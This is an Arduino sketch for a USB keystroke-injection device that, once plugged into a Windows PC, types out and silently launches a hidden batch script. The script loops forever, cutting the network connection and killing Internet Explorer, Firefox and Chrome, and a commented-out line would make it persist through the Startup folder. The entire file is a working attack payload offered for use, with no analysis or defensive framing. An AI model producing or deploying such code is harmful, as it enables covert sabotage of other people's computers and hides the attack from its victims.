#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("cmd /Q /D /T:7F /F:OFF /V:OFF /K");
  delay(5000);
  
  //// A Different directory in case the second one is inaccessable ////
  Keyboard.println("cd %userprofile%\\Downloads\\");
  delay(2000);
  // Keyboard.println("cd C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
  // delay(2000);
  //////////////////////////////////////////////////////////////////////
  
  Keyboard.println("erase /Q a.bat");
  delay(2000);
  Keyboard.println("copy con a.bat");
  delay(2000);
  Keyboard.println("@echo off");
  delay(2000);
  Keyboard.println(":Start");
  delay(2000);
  Keyboard.println("ipconfig /release");
  delay(2000);
  Keyboard.println("taskkill /f /im \"iexplore.exe\"");
  delay(2000);
  Keyboard.println("taskkill /f /im \"firefox.exe\"");
  delay(2000);
  Keyboard.println("taskkill /f /im \"chrome.exe\"");
  delay(2000);
  Keyboard.println("timeout /t 60");
  delay(2000);
  Keyboard.println("Goto Start");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("erase /Q invis.vbs");
  delay(2000);
  Keyboard.println("copy con invis.vbs");
  delay(2000);
  Keyboard.println("CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("wscript.exe invis.vbs a.bat");
  Keyboard.println("exit");
  while(1);
}
